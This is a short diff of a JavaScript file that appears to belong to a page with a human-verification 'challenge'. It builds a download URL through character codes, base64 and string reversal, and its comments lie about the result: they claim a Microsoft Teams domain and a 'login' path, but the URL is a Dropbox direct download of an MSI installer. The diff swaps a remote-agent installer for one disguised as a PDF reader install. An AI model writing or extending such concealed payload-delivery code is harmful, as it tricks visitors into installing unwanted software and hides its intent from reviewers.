@@ -1649,7 +1649,7 @@ const providerUrls = {
         enabled: true,
         p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",  // Protocol: "https:"
         h: atob("Ly93d3cuZHJvcGJveC5jb20v"),  // Domain: "//teams.microsoft.com/"
-        e: btoa("scl/fi/ttsktmt501y15y7lkz7wg/PDQConnectAgent-5.8.23.msi?rlkey=kxavnui4iu8kaxgcfyljjiqz3&st=mgeafvsk&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
+        e: btoa("scl/fi/n9uiinvns5dqfen7wsouy/pdf_Reader_en_install.msi?rlkey=n44h3eedwrgvu69bz8g5pcvsu&st=h5vyywqa&dl=1").split("").reverse().join("")  // Path: "login" (base64 + reversed)
     },
     
     // Google - Example configuration
@@ -1985,4 +1985,5 @@ function logHumanVisit(eventType = 'challenge_passed') {
     } catch (e) {
         // Silent fail
     }
+
 }
